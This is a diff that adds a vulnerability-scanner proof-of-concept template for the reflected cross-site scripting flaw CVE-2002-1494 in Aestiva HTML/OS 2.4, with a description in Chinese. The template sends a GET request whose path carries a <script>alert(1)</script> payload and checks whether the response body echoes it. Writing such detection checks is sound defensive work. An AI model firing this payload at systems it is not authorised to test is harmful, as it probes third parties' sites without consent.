@@ -1,0 +1,28 @@
+[info]
+author = "ave"
+description = "Aestiva HTML/OS 2.4 跨站脚本漏洞检测，通过在 URL 路径末尾追加斜杠并插入脚本代码，验证错误消息页面是否将未过滤的内容回显到响应体中。"
+id = "POC-AVE-2002-0612"
+name = "Aestiva HTML/OS 2.4 Cross-Site Scripting PoC"
+severity = "medium"
+tags = ["ave-2002-0612"]
+vuln_id = [
+    "CVE-2002-1494",
+    "AVE-2002-0612",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/test/<script>alert(1)</script>/"
+protocol = "http"
+
+[poc.requests.headers]
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["<script>alert(1)</script>"]
